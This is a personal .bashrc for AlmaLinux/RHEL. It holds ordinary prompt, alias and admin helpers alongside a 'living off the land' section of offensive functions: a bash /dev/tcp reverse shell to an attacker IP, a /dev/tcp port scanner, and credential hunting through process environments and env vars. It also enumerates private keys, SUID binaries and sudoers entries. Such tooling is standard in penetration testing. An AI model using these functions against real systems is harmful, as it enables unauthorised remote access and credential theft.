# ============================================================
#   ____            _      _        _
#  |  _ \  ___  ___| |    (_)_ __  | |__   _____  __
#  | | | |/ _ \/ __| |    | | '_ \ | '_ \ / _ \ \/ /
#  | |_| |  __/\__ \ |____| | | | || |_) | (_) >  <
#  |____/ \___||___/_____|_|_| |_(_)_.__/ \___/_/\_\
#
#  Makondoo's .bashrc — AlmaLinux / RHEL LotL Edition
#  "No tools installed. No excuses made."
#  Everything here runs on a stock RHEL/AlmaLinux box.
#  /proc is your friend. builtins are your weapons.
# ============================================================

if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]; then
    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
fi
export PATH

# ============================================================
# COLORS — all wrapped in \[...\] for correct line-length
#   counting. Unwrapped escapes = cursor position corruption.
# ============================================================
RED='\[\e[0;31m\]'
LRED='\[\e[1;31m\]'
GREEN='\[\e[0;32m\]'
LGREEN='\[\e[1;32m\]'
YELLOW='\[\e[1;33m\]'
BLUE='\[\e[0;34m\]'
LBLUE='\[\e[1;34m\]'
PURPLE='\[\e[0;35m\]'
CYAN='\[\e[0;36m\]'
LCYAN='\[\e[1;36m\]'
WHITE='\[\e[1;37m\]'
GRAY='\[\e[0;90m\]'
RESET='\[\e[0m\]'

# DECSCUSR cursor shape — injected at end of every PS1 render
# 1=blinking block  2=steady block  5=blinking bar  6=steady bar
CURSOR_RESET='\[\e[2 q\]'

# ============================================================
# PROMPT STATS — pure /proc, zero external tools
# ============================================================

_cpu_pct() {
    # Two /proc/stat reads 100ms apart for accurate delta
    local line1 line2
    read -r line1 < /proc/stat
    read -r line2 < <(sleep 0.1; head -1 /proc/stat)
    local -a s1=($line1) s2=($line2)
    local idle1=$(( s1[4] + s1[5] ))
    local idle2=$(( s2[4] + s2[5] ))
    local total1=$(( s1[1]+s1[2]+s1[3]+s1[4]+s1[5]+s1[6]+s1[7] ))
    local total2=$(( s2[1]+s2[2]+s2[3]+s2[4]+s2[5]+s2[6]+s2[7] ))
    local dtotal=$(( total2 - total1 ))
    local didle=$(( idle2 - idle1 ))
    [ "$dtotal" -eq 0 ] && { awk '{printf "%.1f", $1}' /proc/loadavg; return; }
    awk -v d="$dtotal" -v i="$didle" 'BEGIN{printf "%.1f", (d-i)/d*100}'
}

_ram_pct() {
    awk '/MemTotal/{t=$2} /MemAvailable/{a=$2} END{printf "%.1f", (t-a)/t*100}' /proc/meminfo
}

_load() { awk '{print $1}' /proc/loadavg; }

# ============================================================
# PROMPT
# ============================================================
parse_git_branch() {
    git branch 2>/dev/null | awk '/^\*/{print $2}'
}

selinux_label() {
    local s
    s=$(getenforce 2>/dev/null) || { echo ""; return; }
    case "$s" in
        Enforcing)  printf '\e[0;32m[SEL:ON]\e[0m'  ;;
        Permissive) printf '\e[1;33m[SEL:PM]\e[0m'  ;;
        Disabled)   printf '\e[0;31m[SEL:OFF]\e[0m' ;;
    esac
}

build_prompt() {
    local exit_code=$?
    local cpu ram load
    cpu=$(_cpu_pct)
    ram=$(_ram_pct)
    load=$(_load)

    local status_icon
    if [ "$exit_code" -eq 0 ]; then
        status_icon="${LGREEN}[ok]${RESET}"
    else
        status_icon="${LRED}[!!${exit_code}]${RESET}"
    fi

    local git_part=""
    local branch
    branch=$(parse_git_branch)
    [ -n "$branch" ] && git_part=" ${PURPLE}(${branch})${RESET}"

    local ucol="${LGREEN}"
    [ "$EUID" -eq 0 ] && ucol="${LRED}"

    local cpu_col="${LGREEN}"
    local ram_col="${LGREEN}"
    (( $(awk -v v="$cpu" 'BEGIN{print (v>70)}') )) && cpu_col="${YELLOW}"
    (( $(awk -v v="$cpu" 'BEGIN{print (v>90)}') )) && cpu_col="${LRED}"
    (( $(awk -v v="$ram" 'BEGIN{print (v>70)}') )) && ram_col="${YELLOW}"
    (( $(awk -v v="$ram" 'BEGIN{print (v>90)}') )) && ram_col="${LRED}"

    PS1="\n${ucol}\u${RESET}${WHITE}@${RESET}${LCYAN}\h${RESET} ${YELLOW}\w${RESET}${git_part}"
    PS1+=" ${GRAY}[${RESET}${cpu_col}CPU:${cpu}%${RESET}${GRAY}|${RESET}${ram_col}RAM:${ram}%${RESET}${GRAY}|Load:${load}]${RESET}"
    PS1+="\n${status_icon} ${WHITE}\$${RESET} "
    PS1+="${CURSOR_RESET}"
}

PROMPT_COMMAND="history -a; history -c; history -r; build_prompt"

# ============================================================
# NAVIGATION
# ============================================================
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias ~='cd ~'
alias ll='ls -lah --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias lt='ls -lahtr --color=auto'
alias lsize='ls -lSh --color=auto'
alias lz='ls -lahZ --color=auto'

# ============================================================
# SAFETY NETS
# ============================================================
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
alias ln='ln -i'
alias chown='chown --preserve-root'
alias chmod='chmod --preserve-root'
alias chgrp='chgrp --preserve-root'

# ============================================================
# SELINUX
# ============================================================
alias getstatus='getenforce'
alias sel-on='setenforce 1 && echo "SELinux: Enforcing"'
alias sel-off='setenforce 0 && echo "SELinux: Permissive (temporary)"'
alias sel-log='tail -f /var/log/audit/audit.log | grep AVC'
alias sel-denials='ausearch -m avc -ts recent | audit2why'
alias sel-context='ls -Z'
alias sel-ports='semanage port -l'
alias sel-fix='restorecon -Rv'

# ============================================================
# NETWORK
# ============================================================
alias myip4='curl -s https://api4.ipify.org && echo'
alias myip6='curl -s https://api6.ipify.org && echo'
alias ports='ss -tulnp'
alias listening='ss -tlnp'
alias conns='ss -s'
alias ip6='ip -6 addr show'
alias routes6='ip -6 route show'
alias fw='firewall-cmd --list-all'
alias fw-reload='firewall-cmd --reload'
alias arp-table='cat /proc/net/arp'
alias route-table='cat /proc/net/route'
alias dev-stats='cat /proc/net/dev'

# ============================================================
# SYSTEM
# ============================================================
alias update='dnf update -y'
alias install='dnf install -y'
alias remove='dnf remove -y'
alias search='dnf search'
alias services='systemctl list-units --type=service --state=running'
alias failed='systemctl --failed'
alias logs='journalctl -xe'
alias disk='df -hT | grep -v tmpfs'
alias mem='free -h'
alias psa='ps auxf'
alias psg='ps aux | grep -v grep | grep'
alias mounts='cat /proc/mounts'
alias modules='cat /proc/modules | awk "{print \$1}" | sort'
alias limits='cat /proc/self/limits'
alias fds='ls -la /proc/self/fd'

# ============================================================
# SSH
# ============================================================
alias sshconfig='cat ~/.ssh/config'
alias keygen='ssh-keygen -t ed25519 -C'
alias addkey='ssh-copy-id'

# ============================================================
# CONTAINERS
# ============================================================
alias dps='docker ps'
alias dpsa='docker ps -a'
alias dimg='docker images'
alias dlogs='docker logs -f'
alias dex='docker exec -it'
alias dnet='docker network ls'
alias dvol='docker volume ls'
alias dstats='docker stats --no-stream'
alias pods='podman ps'
alias podsa='podman ps -a'

# ============================================================
# GIT
# ============================================================
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph --decorate --all'
alias gd='git diff'
alias gco='git checkout'
alias gb='git branch -a'

# ============================================================
# LIVING OFF THE LAND
# Stock RHEL binaries only: find awk grep sed cut sort
# uniq cat ls stat ss ip ps id /proc /sys /dev/tcp
# ============================================================

# Kernel & OS fingerprint from /proc
kinfo() {
    echo "=== Kernel / OS ==="
    awk -F= '/PRETTY_NAME/{gsub(/"/, "", $2); print $2}' /etc/os-release 2>/dev/null
    uname -a
    echo "Boot cmdline: $(cat /proc/cmdline)"
    echo "CPU model:    $(awk -F: '/model name/{print $2; exit}' /proc/cpuinfo | xargs)"
    echo "CPU cores:    $(nproc)"
    echo "Architecture: $(uname -m)"
}

# SUID/SGID binary hunt
suid_hunt() {
    echo "[*] SUID binaries:"
    find / -perm -4000 -type f 2>/dev/null | sort
    echo ""
    echo "[*] SGID binaries:"
    find / -perm -2000 -type f 2>/dev/null | sort
}

# World-writable files/dirs (skips /proc /sys /dev)
world_write() {
    echo "[*] World-writable files:"
    find / \( -path /proc -o -path /sys -o -path /dev \) -prune \
        -o -perm -0002 -type f -print 2>/dev/null
    echo ""
    echo "[*] World-writable directories:"
    find / \( -path /proc -o -path /sys -o -path /dev \) -prune \
        -o -perm -0002 -type d -print 2>/dev/null
}

# Processes with non-empty capabilities (reads /proc/$pid/status)
cap_check() {
    echo "[*] Processes with non-empty capabilities:"
    for pid in /proc/[0-9]*; do
        local p="${pid##*/}"
        local caps
        caps=$(awk '/^Cap(Prm|Eff):/{if($2!="0000000000000000") print $0}' \
               "$pid/status" 2>/dev/null)
        if [ -n "$caps" ]; then
            local cmd
            cmd=$(cat "$pid/comm" 2>/dev/null)
            printf "PID %-6s %-20s %s\n" "$p" "$cmd" "$caps"
        fi
    done
}

# All cron jobs across the system
cron_hunt() {
    echo "=== User crontabs ==="
    for u in $(cut -f1 -d: /etc/passwd); do
        local tab
        tab=$(crontab -l -u "$u" 2>/dev/null)
        [ -n "$tab" ] && echo "--- $u ---" && echo "$tab"
    done
    echo ""
    echo "=== System cron files ==="
    for f in /etc/cron* /var/spool/cron/*; do
        [ -f "$f" ] && echo "--- $f ---" && cat "$f" 2>/dev/null
    done
}

# Parse /proc/net/tcp without ss or netstat
tcp_proc() {
    printf "\n%-6s %-22s %-22s %s\n" "UID" "LOCAL" "REMOTE" "STATE"
    echo "-----------------------------------------------------------"
    declare -A states=(
        [01]="ESTABLISHED" [02]="SYN_SENT"   [03]="SYN_RECV"
        [04]="FIN_WAIT1"   [05]="FIN_WAIT2"  [06]="TIME_WAIT"
        [07]="CLOSE"       [08]="CLOSE_WAIT" [09]="LAST_ACK"
        [0A]="LISTEN"      [0B]="CLOSING"
    )
    for f in /proc/net/tcp /proc/net/tcp6; do
        [ -f "$f" ] || continue
        while read -r sl local rem state _ _ _ _ _ uid _; do
            [ "$sl" = "sl" ] && continue
            local lp=$(( 16#${local##*:} ))
            local rp=$(( 16#${rem##*:} ))
            local st="${states[$state]:-$state}"
            printf "%-6s %-22s %-22s %s\n" "$uid" "${local}(${lp})" "${rem}(${rp})" "$st"
        done < "$f"
    done
}

# Sensitive file permission audit
sensitive_audit() {
    echo "[*] Sensitive file permissions:"
    for f in /etc/passwd /etc/shadow /etc/sudoers /etc/ssh/sshd_config \
              /root/.ssh/authorized_keys /etc/hosts /etc/crontab \
              /etc/gshadow /etc/group; do
        [ -e "$f" ] && stat -c "%A %U:%G %n" "$f"
    done
    echo ""
    echo "[*] Files modified in /etc in last 24h:"
    find /etc -mtime -1 -type f 2>/dev/null
}

# Dump process environment (credential hunting)
proc_env() {
    local pid="${1:-self}"
    echo "[*] Environment for PID $pid:"
    tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null | sort
}

# Map PIDs to open sockets via /proc/fd
proc_sockets() {
    echo "[*] PID to socket mapping:"
    for pid in /proc/[0-9]*; do
        local p="${pid##*/}"
        local cmd
        cmd=$(cat "$pid/comm" 2>/dev/null) || continue
        for fd in "$pid/fd"/*; do
            local target
            target=$(readlink "$fd" 2>/dev/null)
            [[ "$target" == socket* ]] && printf "PID %-6s %-20s %s\n" "$p" "$cmd" "$target"
        done
    done | sort -k3 | uniq
}

# Connectivity check via /dev/tcp (no curl/nc needed)
# Usage: tcp_check google.com 443
tcp_check() {
    local host="$1" port="$2"
    [ -z "$host" ] || [ -z "$port" ] && { echo "Usage: tcp_check <host> <port>"; return 1; }
    (echo >/dev/tcp/"$host"/"$port") 2>/dev/null \
        && echo "[+] $host:$port OPEN" \
        || echo "[-] $host:$port CLOSED/FILTERED"
}

# Port scan via /dev/tcp — no nmap required
# Usage: port_scan 192.168.1.1 22 80 443 8080 3306
port_scan() {
    local host="$1"; shift
    [ -z "$host" ] && { echo "Usage: port_scan <host> <port> [port...]"; return 1; }
    for port in "$@"; do
        (echo >/dev/tcp/"$host"/"$port") 2>/dev/null \
            && printf "[+] %-6s OPEN\n"   "$port" \
            || printf "[-] %-6s closed\n" "$port"
    done
}

# Bash reverse shell via /dev/tcp
# Usage: revshell <attacker-ip> <port>
revshell() {
    local ip="$1" port="$2"
    [ -z "$ip" ] || [ -z "$port" ] && { echo "Usage: revshell <ip> <port>"; return 1; }
    bash -i >& /dev/tcp/"$ip"/"$port" 0>&1
}

# Hunt env vars that look like credentials
env_audit() {
    echo "[*] Potentially interesting env vars:"
    env | grep -iE 'pass|secret|key|token|api|auth|cred|db|mysql|mongo|redis|aws|gcp|azure' | sort
}

# Check for writable entries in PATH
path_audit() {
    echo "[*] Writable PATH entries:"
    IFS=: read -ra path_dirs <<< "$PATH"
    for d in "${path_dirs[@]}"; do
        [ -w "$d" ] && echo "[!] WRITABLE: $d"
    done
    echo "Done."
}

# SSH key surface enumeration
ssh_surface() {
    echo "=== authorized_keys ==="
    find / -name "authorized_keys" 2>/dev/null -exec echo "[+] {}" \; -exec cat {} \;
    echo ""
    echo "=== Private keys ==="
    find / \( -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "id_ecdsa" \) \
        2>/dev/null | while read -r f; do
        echo "[+] $f  $(stat -c "%A %U" "$f")"
    done
}

# Sudoers surface
sudo_surface() {
    echo "[*] Sudoers entries:"
    [ -r /etc/sudoers ] && grep -v '^#\|^$\|^Defaults' /etc/sudoers
    for f in /etc/sudoers.d/*; do
        [ -r "$f" ] && echo "--- $f ---" && grep -v '^#\|^$\|^Defaults' "$f"
    done
    echo ""
    echo "[*] Current user sudo rights:"
    sudo -l 2>/dev/null || echo "(sudo -l unavailable)"
}

# ============================================================
# GENERAL FUNCTIONS
# ============================================================
extract() {
    [ ! -f "$1" ] && { echo "'$1' is not a valid file"; return 1; }
    case "$1" in
        *.tar.bz2)  tar xjf "$1"    ;;
        *.tar.gz)   tar xzf "$1"    ;;
        *.tar.xz)   tar xJf "$1"    ;;
        *.bz2)      bunzip2 "$1"    ;;
        *.rar)      unrar x "$1"    ;;
        *.gz)       gunzip "$1"     ;;
        *.tar)      tar xf "$1"     ;;
        *.tbz2)     tar xjf "$1"    ;;
        *.tgz)      tar xzf "$1"    ;;
        *.zip)      unzip "$1"      ;;
        *.Z)        uncompress "$1" ;;
        *.7z)       7z x "$1"       ;;
        *)          echo "No handler for '$1'" ;;
    esac
}

mkcd()     { mkdir -p "$1" && cd "$1" || return; }
portcheck(){ nc -zv "$1" "$2" 2>&1; }
genpass()  { tr -dc 'A-Za-z0-9!@#$%^&*' </dev/urandom | head -c "${1:-32}"; echo; }
bak()      { cp "$1" "$1.bak.$(date +%Y%m%d_%H%M%S)" && echo "Backup: $1.bak.*"; }
reload()   { source ~/.bashrc && echo ".bashrc reloaded"; }
tlog()     { tail -f "$1" | grep --line-buffered -E 'error|warn|crit|fail|deny' --color=auto; }

openports() {
    printf "\n%-7s %-7s %-25s %s\n" "Proto" "State" "Local" "Process"
    echo "------------------------------------------------------"
    ss -tulnp | awk 'NR>1'
}

bashers() {
    awk 'NR>1{print $3}' /proc/net/tcp /proc/net/tcp6 2>/dev/null \
        | awk -F: 'length($1)==8{
            printf "%d.%d.%d.%d\n",
            strtonum("0x"substr($1,7,2)),
            strtonum("0x"substr($1,5,2)),
            strtonum("0x"substr($1,3,2)),
            strtonum("0x"substr($1,1,2))
        }' | sort | uniq -c | sort -nr | head -20
}

sel-allow() {
    ausearch -c "$1" --raw | audit2allow -M "$1" \
        && semodule -i "$1".pp \
        && echo "Module '$1' loaded"
}

# ============================================================
# HISTORY
# ============================================================
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTCONTROL=ignoredups:erasedups
export HISTTIMEFORMAT="%F %T  "
shopt -s histappend
shopt -s checkwinsize
shopt -s cdspell
set -o noclobber

if [[ $- == *i* ]]; then
    bind '"\e[A": history-search-backward'
    bind '"\e[B": history-search-forward'
fi

# ============================================================
# MOTD — zero external binaries, pure /proc
# ============================================================
if [[ $- == *i* ]]; then
    _os=$(awk -F= '/PRETTY_NAME/{gsub(/"/, "", $2); print $2}' /etc/os-release 2>/dev/null || uname -s)
    _kern=$(uname -r)
    _uptime=$(awk '{d=int($1/86400); h=int(($1%86400)/3600); m=int(($1%3600)/60)
                    printf "%dd %dh %dm", d, h, m}' /proc/uptime)
    _load=$(awk '{print $1, $2, $3}' /proc/loadavg)
    _mem=$(awk '/MemTotal/{t=$2} /MemAvailable/{a=$2}
                END{printf "%dMiB used / %dMiB total", (t-a)/1024, t/1024}' /proc/meminfo)
    _disk=$(df -h / | awk 'NR==2{print $3" used / "$2" ("$5")"}')
    _sel=$(getenforce 2>/dev/null || echo "n/a")
    _ip=$(ip route get 1.1.1.1 2>/dev/null | awk '/src/{print $7}')

    echo ""
    echo -e "  \e[1;36m$(hostname)\e[0m  |  \e[1;33m${_kern}\e[0m  |  \e[1;32m${_os}\e[0m"
    echo -e "  Uptime:  \e[1;37m${_uptime}\e[0m"
    echo -e "  Load:    \e[1;37m${_load}\e[0m"
    echo -e "  Memory:  \e[1;37m${_mem}\e[0m"
    echo -e "  Disk:    \e[1;37m${_disk}\e[0m"
    echo -e "  SELinux: \e[1;37m${_sel}\e[0m"
    echo -e "  IP:      \e[1;37m${_ip}\e[0m"
    echo ""
    echo -e "  \e[0;35m\"In /proc we trust. The rest we verify.\"\e[0m"
    echo ""
fi

# ============================================================
export EDITOR=vim
export VISUAL=vim
export PAGER=less
export LESS='-R'

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ]          && \. "$NVM_DIR/nvm.sh"
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
